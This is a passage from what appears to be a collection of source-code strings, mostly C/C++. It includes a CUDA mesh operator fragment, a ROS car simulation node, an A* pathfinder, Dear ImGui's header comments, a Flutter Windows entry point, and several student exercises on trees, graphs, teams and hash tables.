data.numberOfBatches*data.maxHitPoints));\r\n\r\n\t\t// Get the vertexFaces, vertexFacesId\r\n\t\tcutilSafeCall(cudaMalloc(&data.d_vertexFaces, sizeof(int) * vertexFaces.size()));\r\n\t\tcutilSafeCall(cudaMemcpy(data.d_vertexFaces, vertexFaces.data(), sizeof(int)*vertexFaces.size(), cudaMemcpyHostToDevice));\r\n\t\tcutilSafeCall(cudaMalloc(&data.d_vertexFacesId, sizeof(int) * vertexFacesId.size()));\r\n\t\tcutilSafeCall(cudaMemcpy(data.d_vertexFacesId, vertexFacesId.data(), sizeof(int)*vertexFacesId.size(), cudaMemcpyHostToDevice));\r\n\r\n\t\t// Vertex Normal\r\n\t\tcutilSafeCall(cudaMalloc(&data.d_vertexNormal, sizeof(float3) * data.numberOfVertices));\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"No triangular faces!\" << std::endl;\r\n\t}\r\n\r\n\tcutilSafeCall(cudaMalloc(&data.d_closestFaceBool, sizeof(bool) * data.numberOfBatches * data.F));\r\n\tcutilSafeCall(cudaMalloc(&data.d_closestFaceIds, sizeof(int) * data.numberOfBatches * data.maxFacesAttached));\r\n\r\n\t/////////////////////////////////////////////////////////////////////////\r\n\t//---CONSOLE OUTPUT---\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"|||||||||||||||||||||||||||||||||||||||||||||||||||||||||\" << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"OPERATOR: GlobalToUVSpaceGpu\" << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"Input(0) vertex positions dimensions: \" << 2 << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(0) mesh points \" << 0 << \" size: \" << data.numberOfVertices << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(0) xyz dimensions dimension \" << 1 << \" size: \" << 3 << std::endl;\r\n\r\n\tstd::cout << \"Input(1) ray point positions dimensions: \" << 2 << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(1) points on the ray dimension \" << 0 << \" size: \" << data.numberOfBatches << std::endl;\r\n\tstd::cout << \"\t\" << \"Input(1) xyz dimensions dimension \" << 1 << \" size: \" << 3 << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"Output(0) uvd dimensions: \" << 2 << std::endl;\r\n\tstd::cout << \"\t\" << \"Ouput(0) uvd points dimension \" << 0 << \" size: \" << data.numberOfBatches << std::endl;\r\n\tstd::cout << \"\t\" << \"Ouput(0) xyz dimensions dimension \" << 1 << \" size: \" << 7 << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"Attr(0) Mesh File Path: \" << meshFilePath << std::endl;\r\n\tstd::cout << \"Attr(1) Padding: \" << data.padding << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << \"|||||||||||||||||||||||||||||||||||||||||||||||||||||||||\" << std::endl;\r\n\r\n\tstd::cout << std::endl;\r\n}\r\n\r\n//==============================================================================================//\r\n\r\nvoid GlobalToUVSpaceGPUOp::getVertexFaces(int numberOfVertices, std::vector<int> faces, std::vecto",
    "#include <cmath>\n#include <vector>\n#include <ros/ros.h>\n#include <geometry_msgs/Point.h>\n#include <geometry_msgs/Twist.h>\n#include <visualization_msgs/Marker.h>\n#include <tf2/LinearMath/Quaternion.h>\n#include <tf2/LinearMath/Matrix3x3.h>\n#include <tf2_geometry_msgs/tf2_geometry_msgs.h>\n\nusing namespace std;\n\nros::Publisher car_position_pub;\nros::Publisher rviz_car_pub;\n\nstd::pair<double, double> car_position = {0.0, 0.0};\n\nfloat car_velocity = 0.0;\nfloat car_steering_rad = 0.0;\n\ndouble deg2rad = M_PI/180;\ndouble rad2deg = 180/M_PI;\ndouble yaw_gain_deg, car_yaw_rad = 0.0;\n\nvoid Contorl_Callback(const geometry_msgs::Twist::ConstPtr &control_msg)\n{\n    car_velocity = control_msg->linear.x;\n    car_steering_rad = control_msg->angular.z;\n}\n\nvoid Rviz_car()\n{\n    visualization_msgs::Marker ego_car;\n\n    ego_car.header.frame_id = \"edu_frame\";\n    ego_car.header.stamp = ros::Time::now();\n    ego_car.ns = \"ego_car\";\n    ego_car.id = 0;\n    ego_car.type = visualization_msgs::Marker::CUBE;\n    ego_car.action = visualization_msgs::Marker::ADD;\n    ego_car.lifetime = ros::Duration(0.2);\n\n    ego_car.pose.position.x = car_position.first;\n    ego_car.pose.position.y = car_position.second;\n    ego_car.pose.position.z = 0;\n\n    tf2::Quaternion quaternion;\n\n    quaternion.setRPY(0, 0, car_yaw_rad);\n\n    ego_car.pose.orientation = tf2::toMsg(quaternion);\n\n    ego_car.scale.x = 1.04;\n    ego_car.scale.y = 0.75;\n    ego_car.scale.z = 0.1;\n\n    ego_car.color.r = 0.0;      \n    ego_car.color.g = 0.0;     \n    ego_car.color.b = 1.0;\n    \n    ego_car.color.a = 0.75;\n\n    rviz_car_pub.publish(ego_car);\n}\n\nint main(int argc, char **argv)\n{\n\tros::init(argc, argv, \"simul_car_node\");\n\tros::NodeHandle nh;\n\n    ros::Rate loop(8);\n\n    ros::Subscriber car_control_sub = nh.subscribe<geometry_msgs::Twist>(\"/control_value\", 10, &Contorl_Callback);\n\n    car_position_pub = nh.advertise<geometry_msgs::Point> (\"/car_position\", 10);\n    rviz_car_pub = nh.advertise<visualization_msgs::Marker> (\"/rviz_car_position\", 10);\n\n    ROS_INFO(\"Simulation Running...\");\n\n    geometry_msgs::Point car_pos;\n\n\twhile(ros::ok())\n    {\t\n        ros::Time ros_stamp = ros::Time::now();\n        double stamp = ros_stamp.toSec();\t\n\n        static double last_stamp = stamp;\n\n        double dt_run = stamp - last_stamp;\n\n        double car_yaw_steering_rad = car_steering_rad - car_yaw_rad;    \n    \n        double yaw_rate_rad = car_velocity/1.04 * car_yaw_steering_rad;\n        yaw_gain_deg = yaw_rate_rad*rad2deg*dt_run;\n        car_yaw_rad = car_yaw_rad + yaw_gain_deg*deg2rad;\n\n        double dist = car_velocity*dt_run;\n\n        car_position.first = car_position.first + dist*cos(car_steering_rad);\n        car_position.second = car_position.second + dist*sin(car_steering_rad);\n\n        car_pos.x = car_position.first;\n        car_pos.y = car_position.second;\n        car_pos.z = 0.0;\n\n        car_position_pub.publish(car_pos);\n        \n        Rviz_car();\n        \n        car_velocity = 0.0;\n\n        loop.sleep();\n\n        last_stamp = stamp;\n\n\t\tros::spinOnce();\n    }\n\n    return 0;\n}\n",
    "#include \"AStar.h\"\n\n\nAStar::AStar(char (*map)[szOfMap+1]){\n    obstacle = vector<vector<bool>>(szOfMap+1, vector<bool>(szOfMap+1, false));\n\n    for(int i = 0; i < szOfMap; i++){\n        for(int j = 0; j < szOfMap; j++){\n            if(map[i][j] == '#' || map[i][j] == '*')\n                obstacle[i][j] = true;\n        }\n    }\n\n    lockMap = vector<vector<bool>> (szOfMap+1, vector<bool> (szOfMap+1, false));\n}\n\n//TODO \u8c03\u7528\u524d\u9700\u8981\u68c0\u67e5\u662f\u5426\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5206\u533a\nbool AStar::searchPath(int xStart, int yStart, int xEnd, int yEnd, vector<Coord>& path){\n\n    Coord start(xStart, yStart);\n    //\u9012\u5f52\u7ed3\u675f\u7684\u6807\u5fd7\n    Coord flag(-1, -1, abs(xStart-xEnd)+abs(yStart-yEnd), 0);\n    Coord end(xEnd, yEnd);\n    Coord empty(-2, -2, 40000, 40000);\n\n    vector<vector<Coord>> parentMap(szOfMap+1, vector<Coord>(szOfMap+1, empty));\n\n    parentMap[start.x][start.y] = flag;\n\n    vector<vector<int>> closeMap(szOfMap, vector<int>(szOfMap, 0));\n\n    priority_queue<Coord, deque<Coord>, CoordCompare> openQueue;\n\n    //\u6784\u9020\u5f00\u59cb\u70b9\n    openQueue.push(start);\n\n    vector<vector<int>> directions = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};\n\n    while(!openQueue.empty()){\n        //\u83b7\u5f97\u5806\u9876\u5143\u7d20\n        Coord top = openQueue.top();\n        openQueue.pop();\n\n        //\u8bbf\u95ee\u8fc7\n        if(closeMap[top.x][top.y])\n            continue;\n\n        closeMap[top.x][top.y] = 1;\n\n        //\u5230\u8fbe\u7ec8\u70b9\n        if(top == end){\n            //\u6784\u5efa\u8def\u5f84\n            path.push_back(end);\n            auto p = parentMap[end.x][end.y];\n            while(p != flag && p != end){\n                path.push_back(p);\n                p = parentMap[p.x][p.y];\n            }\n            return true;\n        }\n\n        Coord topPath = parentMap[top.x][top.y];\n\n        for(auto& direction : directions){\n            int xNew = top.x+direction[0];\n            int yNew = top.y+direction[1];\n            //\u5750\u6807\u65e0\u6548\n            if(!isValidCoord(xNew, yNew))\n                continue;\n\n            //\u65b0\u8282\u70b9\u5728close\u5217\u8868\u91cc\uff0c\u5ffd\u7565\n            if(closeMap[xNew][yNew])\n                continue;\n\n            int distanceNew = abs(end.x-xNew)+ abs(end.y-yNew);\n\n            openQueue.push(Coord{xNew, yNew, distanceNew, topPath.cost+1});\n\n            //\u66f4\u65b0\u8def\u5f84\n            if(distanceNew+topPath.cost+1 < parentMap[xNew][yNew].cost+parentMap[xNew][yNew].distance){\n                parentMap[xNew][yNew].x = top.x;\n                parentMap[xNew][yNew].y = top.y;\n                parentMap[xNew][yNew].cost = topPath.cost + 1;\n                parentMap[xNew][yNew].distance = distanceNew;\n            }\n        }\n\n    }\n    return false;\n\n}\n\n// \u6bcf\u8f6e\u7ed3\u675f\u4ee5\u540e\u90fd\u9700\u8981\u6e05\u7406lockMap\uff01\uff01\uff01\nvoid AStar::clearLockMap(){\n//    for(int i = 0; i < szOfMap; i++){\n//        for(int j = 0; j < szOfMap; j++){\n//            lockMap[i][j] = false;\n//        }\n//    }\n    for (auto& [x, y] : lockedCoords) {\n        lockMap[x][y] = false;\n    }\n    lockedCoords.clear();\n}\n\nbool AStar::isLocked(int x, int y) {\n    return lockMap[x][y];\n}\n\nbool AStar::isValidCoord(int x, int y){\n    //\u5728\u5730\u56fe\u5185\n    if(x < 0 || x >= szOfMap || y < 0 || y >= szOfMap)\n        return false;\n    //\u975e\u969c\u788d\u7269\u548c\u6d77\u6d0b \u4e14\u6ca1\u6709\u88ablock\n    return !obstacle[x][y] && !lockMap[x][y];\n}\n\nvoid AStar::addLockedCoord(int x, int y) {\n    if (lockedCoords.count({x, y})) {\n        return;\n    }\n    lockedCoords.insert({x, y});\n    lockMap[x][y] = true;\n}\n\nvoid AStar::removeLockedCoord(int x, int y) {\n    if (!lockedCoords.count({x, y})) {\n        return;\n    }\n    lockedCoords.erase({x, y});\n    lockMap[x][y] = false;\n}",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nclass Node\r\n{\r\npublic:\r\n    int data;\r\n    Node *left;\r\n    Node *right;\r\n    // create the construte\r\n    Node(int data)\r\n    {\r\n        this->data = data;\r\n        left = NULL;\r\n        right = NULL;\r\n    }\r\n};\r\n// create the function\r\nNode *buildTree(int data)\r\n{\r\n    // 1-data indicates that we have arrived at the leaf node & hence return NULL.\r\n    // depands on the question\r\n    if (data == -1)\r\n    {\r\n        return NULL;\r\n    }\r\n    // create root node(solve one case )\r\n    Node *root = new Node(data);\r\n\r\n    // recussion handle for left & right subtree\r\n    int leftData;\r\n\r\n    cout << \"Enter data of left of\" << data << endl;\r\n    cin >> leftData;\r\n    root->left = buildTree(leftData);\r\n\r\n    int rightData;\r\n    cout << \"Enter data right of \" << data << endl;\r\n    cin >> rightData;\r\n    root->right = buildTree(rightData);\r\n\r\n    return root;\r\n}\r\nNode *buildoflevelOder(Node *root)\r\n{\r\n    queue<Node *> q;\r\n    cout << \"Enter data a data for root\" << endl;\r\n    int data;\r\n    cin >> data;\r\n    root = new Node(data);\r\n    q.push(root);\r\n\r\n    while (!q.empty())\r\n    {\r\n        Node *temp = q.front();\r\n        q.pop();\r\n\r\n        cout << \"Enter left node for \" << temp->data << endl;\r\n        int leftData;\r\n        cin >> leftData;\r\n\r\n        if (leftData != -1)\r\n        {\r\n            temp->left = new Node(leftData);\r\n            q.push(temp->left);\r\n        }\r\n        cout << \"Enter right node for \" << temp->data << endl;\r\n        int rightData;\r\n        cin >> rightData;\r\n\r\n        if (rightData != -1)\r\n        {\r\n            temp->right = new Node(rightData);\r\n            q.push(temp->left);\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    Node *root;\r\n    int data;\r\n    cout << \"Enter data for root node\" << endl;\r\n    cin >> data;\r\n    root = buildTree(data);\r\n\r\n    buildoflevelOder(root);\r\n    return 0;\r\n}",
    "// dear imgui, v1.90.7\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ ........................ https://dearimgui.com/faq (in repository as docs/FAQ.md)\n// - Homepage ................... https://github.com/ocornut/imgui\n// - Releases & changelog ....... https://github.com/ocornut/imgui/releases\n// - Gallery .................... https://github.com/ocornut/imgui/issues/7503 (please post your screenshots/video there!)\n// - Wiki ....................... https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n//   - Getting Started            https://github.com/ocornut/imgui/wiki/Getting-Started (how to integrate in an existing app by adding ~25 lines of code)\n//   - Third-party Extensions     https://github.com/ocornut/imgui/wiki/Useful-Extensions (ImPlot & many more)\n//   - Bindings/Backends          https://github.com/ocornut/imgui/wiki/Bindings (language bindings, backends for various tech/engines)\n//   - Glossary                   https://github.com/ocornut/imgui/wiki/Glossary\n//   - Debug Tools                https://github.com/ocornut/imgui/wiki/Debug-Tools\n//   - Software using Dear ImGui  https://github.com/ocornut/imgui/wiki/Software-using-dear-imgui\n// - Issues & support ........... https://github.com/ocornut/imgui/issues\n// - Test Engine & Automation ... https://github.com/ocornut/imgui_test_engine (test suite, test engine to automate your apps)\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2024 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Funding\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ID STACK\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] ITEM SUBMISSION\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------",
    "#include<iostream>\r\nusing namespace std;\r\nclass Flight\r\n{\r\n\tint a[10][10],n;\r\n\tstring name[10];\r\n\tpublic:\r\n\t\tvoid read();\r\n\t\tvoid disp();\r\n};\r\nvoid Flight::read()\r\n{\r\n\tint i,j;\r\n\tcout<<\"Enter number of cities:\";\r\n\tcin>>n;\r\n\tfor(int i=0;i<n;i++)\r\n\t{\r\n\t\tfor(int j=0;j<n;j++)\r\n\t\t{\r\n\t\t\ta[i][j]=0;\r\n\t\t}\r\n\t}\r\n\tfor(int k=0;k<n;k++)\r\n\t{\r\n\t\tcout<<\"Enter name of cities:\";\r\n\t\tcin>>name[k];\r\n\t}\r\n\tfor(i=0;i<n;i++)\r\n\t{\r\n\t\tfor(j=0;j<n;j++)\r\n\t\t{\r\n\t\t\tif(i==j)\r\n\t\t\t{\r\n\t\t\t\ta[i][j]=0;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif(a[i][j]==0)\r\n\t\t\t{\r\n\t\t\t\tchar ch;\r\n\t\t\t\tcout<<\"Is any flight for \"<<name[i]<<\" to \"<<name[j]<<\" or not (y/n):\";\r\n\t\t\t\tcin>>ch;\r\n\t\t\t\tif(ch=='y'||ch=='Y')\r\n\t\t\t{\r\n\t\t\t\tcout<<\"Enter the time required for the flight (in min):\";\r\n\t\t\t\tcin>>a[i][j];\r\n\t\t\t\ta[j][i]=a[i][j];\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\ta[i][j]=0;\r\n\t\t\t}\r\n\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid Flight::disp()\r\n{\r\n\tfor(int k=0;k<n;k++)\r\n\t{\r\n\t\tcout<<\"  \"<<name[k];\r\n\t\t\r\n\t}\r\n\tcout<<endl;\r\n\tfor(int i=0;i<n;i++)\r\n\t{\r\n\t\tcout<<name[i]<<\"|\";\r\n\t\t\r\n\t\tfor(int j=0;j<n;j++)\r\n\t\t{\r\n\t\t\tcout<<a[i][j]<<\" \";\r\n\t\t}\r\n\t\tcout<<\"|\"<<endl;\r\n\t}\r\n}\r\nint main()\r\n{\r\n\tFlight f;\r\n\tf.read();\r\n\tf.disp();\r\n\treturn 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <fstream>\n\nusing namespace std;\nclass Player {\nprivate:\n    string name;\n    int yearOfBirth;\n    int height;\n    int internationalGoals;\n    string nationality;\npublic:\n\n    //setters\n    void setName(string name){this->name = name;}\n    void setYearOfBirth(int yearOfBirth){this->yearOfBirth = yearOfBirth;}\n    void setHeight(int height){this->height = height;}\n    void setInternationalGoals(int internationalGoals){this->internationalGoals = internationalGoals;}\n    void setNationality(string nationality){this->nationality = nationality;}\n\n    //getters\n    string getName() const { return this->name;}\n    int getYearOfBirth() const  { return this->yearOfBirth;}\n    int getInternationalGoals() const {return this->internationalGoals;}\n    int getHeight(){return this->height;}\n\n    string getNationality() const {return this->nationality;}\n};\n\nclass NationalTeam {\nprivate:\n    string country;\n    Player players[18];\n    bool active[18];\n    int size;\npublic:\n    NationalTeam(string country = \" \") {\n        this->country = country;\n        size = 0;\n        for (int i = 0; i < 18; i++) active[i]=false;\n    }\n\n    bool addPlayer(const Player& player) {\n        if(this->size >= 18) return false;\n\n        this->players[this->size++] = player;\n        this->active[this->size++] = true;\n        return true;\n    }\n\n    bool removePlayer(string playerName) {\n        for (int i = 0; i < this->size; i++) {\n            if (players[i].getName() == playerName) {active[i] = false;return true;}\n            return false;\n        }\n    }\n\n    // to return total number of Players in the team\n    int getNumOfallPlayers() const {return this->size;}\n\n    // to return the average height of the team Players\n    int avgHeight() const {\n        int sum = 0;\n        for (int i = 0; i < this->size; i++) {sum+=players[i].getYearOfBirth();}\n        return sum/this->size;\n    }\n\n    // to return the oldest player object\n    Player oldestPlayer() const {\n        int oldestPlayer = players[0].getYearOfBirth();\n        int i;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getYearOfBirth() > oldestPlayer){oldestPlayer = players[i].getYearOfBirth();}\n        }return players[i];\n    }\n\n   // to return the youngest player object\n   Player youngestPlayer() const {\n        int youngestPlayer = players[0].getYearOfBirth();\n        int i;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getYearOfBirth() < youngestPlayer){youngestPlayer = players[i].getYearOfBirth();}\n        }return players[i];\n    }\n\n   // to return the average number of international goals per player in the team\n   int avgIntGoals() const {\n        int sum = 0;\n        for (int i = 0; i < this->size; i++) {sum+=players[i].getInternationalGoals();}\n        return sum/this->size;\n    }\n\n   // to return the player with the highest number of international goals\n   Player highestIntGoals() const {\n        int highestIntGoals = players[0].getInternationalGoals();\n        int i = 1;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getInternationalGoals() > highestIntGoals){highestIntGoals = players[i].getInternationalGoals();}\n        }return players[i];\n    }\n\n    string getCountry() const{return this->country;}\n\n    // to output a team\u2019s country and its allPlayers info.\n    friend ostream &operator<<( ostream &output, NationalTeam &team) {\n        output << \"team\u2019s country : \" << team.getCountry();\n        for (int i = 0 ; i < team.getNumOfallPlayers(); i++) {\n            output << \"player #\" << i+1 << \": \" << endl;\n            output << \"name: \" << team.players[i].getName() << endl;\n            output << \"get year of birth: \" << team.players[i].getYearOfBirth() << endl;\n            output << \"height: \" << team.players[i].getHeight() << endl;\n            output << \"international goals: \" << team.players[i].getInternationalGoals() << endl;\n            output << \"nationality: \" << team.players[i].getNationality() << endl;\n        }\n        return output;\n    }\n};\n\n\nPlayer* readallPlayersFromFile(ifstream& allPlayersInfo, Player *allPlayers, int size) {\n    string strInfo; int intInfo, index = 0; Player player;\n\n    allPlayers = new Player[size];\n\n    while (getline(allPlayersInfo, strInfo)) {\n        if(index >= size){break;}\n        player.setName(strInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setYearOfBirth(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setHeight(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setInternationalGoals(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        player.setNationality(strInfo);\n\n        // to ignor sprated space in the file\n        getline(allPlayersInfo, strInfo);\n\n        allPlayers[index++] = player;\n    }\n    allPlayersInfo.close();\n    return allPlayers;\n}\n\nvoid writeS",
    "#include <iostream>\r\n#include <list>\r\n#include <stack>\r\n#include <queue>\r\nusing namespace std;\r\nclass Graph {\r\n    int V; // Number of vertices\r\n    list<int> *adjList; // Pointer for adjacency list\r\n    bool **adjMatrix; // Pointer for adjacency matrix\r\npublic:\r\n    Graph(int V) {\r\n        this->V = V;\r\n        adjList = new list<int>[V];\r\n        // Initialize adjacency matrix\r\n        adjMatrix = new bool*[V];\r\n        for (int i = 0; i < V; i++) {\r\n            adjMatrix[i] = new bool[V];\r\n            for (int j = 0; j < V; j++) {\r\n                adjMatrix[i][j] = false;\r\n            }\r\n        }\r\n    }\r\n\t// Function to add an edge for both representations\r\n\tvoid addEdge(int v, int w) {\r\n        adjList[v].push_back(w); // Add w to v's list.\r\n        adjList[w].push_back(v); // Since the graph is undirected\r\n\t\t// For adjacency matrix\r\n        adjMatrix[v][w] = true;\r\n        adjMatrix[w][v] = true;\r\n    }\r\n\t// DFS utility function using adjacency matrix\r\n    void DFSUtilMatrix(int v, bool visited[]) {\r\n        // Mark the current node as visited and print it\r\n        visited[v] = true;\r\n        cout << v << \" \";\r\n\t\t// Recur for all vertices adjacent to this vertex\r\n        for (int i = 0; i < V; i++) {\r\n            if (adjMatrix[v][i] && !visited[i]) {\r\n                DFSUtilMatrix(i, visited);\r\n            }\r\n        }\r\n    }\r\n\t// DFS traversal of the vertices reachable from v using adjacency matrix\r\n    void DFSMatrix(int v) {\r\n        bool *visited = new bool[V];\r\n        for (int i = 0; i < V; i++)\r\n            visited[i] = false;\r\n        DFSUtilMatrix(v, visited);\r\n        cout << endl;\r\n    }\r\n\t// BFS traversal of the graph using adjacency list\r\n    void BFSList(int s) {\r\n        // Mark all the vertices as not visited\r\n        bool *visited = new bool[V];\r\n        for (int i = 0; i < V; i++)\r\n            visited[i] = false;\r\n\t\t// Create a queue for BFS\r\n        queue<int> queue;\r\n        // Mark the current node as visited and enqueue it\r\n        visited[s] = true;\r\n        queue.push(s);\r\n        while (!queue.empty()) {\r\n            // Dequeue a vertex from queue and print it\r\n            s = queue.front();\r\n            cout << s << \" \";\r\n            queue.pop(); // Get all adjacent vertices of the dequeued vertex s\r\n            // If an adjacent has not been visited, then mark it visited and enqueue it\r\n            for (auto i = adjList[s].begin(); i != adjList[s].end(); ++i) {\r\n                if (!visited[*i]) {\r\n                    visited[*i] = true;\r\n                    queue.push(*i);\r\n                }\r\n            }\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\nint main() {\r\n    // Create a graph given in the above diagram (6 vertices)\r\n    Graph g(6);\r\n    g.addEdge(0, 1); // College to Library\r\n    g.addEdge(0, 2); // College to Sports Complex\r\n    g.addEdge(0, 3); // College to Cafeteria\r\n    g.addEdge(1, 4); // Library to Hostel\r\n    g.addEdge(2, 5); // Sports Complex to Parking Lot\r\n    g.addEdge(3, 5); // Cafeteria to Parking Lot\r\n    cout << \"DFS (starting from vertex 0, College, using adjacency matrix): \\n\";\r\n    g.DFSMatrix(0);\r\n    cout << \"BFS (starting from vertex 0, College, using adjacency list): \\n\";\r\n    g.BFSList(0);\r\n    return 0;\r\n}\r\nOUTPUT:\r\nDFS (starting from vertex 0, College, using adjacency matrix):\r\n0 1 4 2 5 3\r\n\r\nBFS (starting from vertex 0, College, using adjacency list):\r\n0 1 2 3 4 5\r\n\r\n",
    "//birinci k\u0131s\u0131m\r\n#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<string.h>\r\n#define tablo_boyutu adet\r\nint adet = 5;\r\ntypedef struct Liste {\r\n\tint index;\r\n\tint musteri_numarasi;\r\n\tchar musteri_ad[100];\r\n\tchar musteri_soyad[100];\r\n\tstruct Liste * sonraki;\r\n} Row;\r\n\r\ntypedef struct Tablo {\r\n\tRow satirlar[];\r\n} Tablo;\r\n\r\nTablo Tablolar;\r\n\r\nvoid initialise() { //Olu\u015fturulan listeye -1 de\u011ferlerini at\u0131yorum\r\n\tfor(int i = 0; i < tablo_boyutu; i++) {\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].index = -1;\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].sonraki = NULL;\r\n\t}\r\n}\r\nint Hash(int numara) { //Mod \u0130\u015flemini yapt\u0131\u011f\u0131m fonksiyon\r\n\treturn (numara % tablo_boyutu);\r\n}\r\n\r\n\r\nint adet = 5;\r\ntypedef struct Liste {\r\n\tint index;\r\n\tint link;\r\n\tint musteri_numarasi;\r\n\tchar musteri_ad[100];\r\n\tchar musteri_soyad[100];\r\n} Row;\r\n\r\ntypedef struct tablo {\r\n\tRow 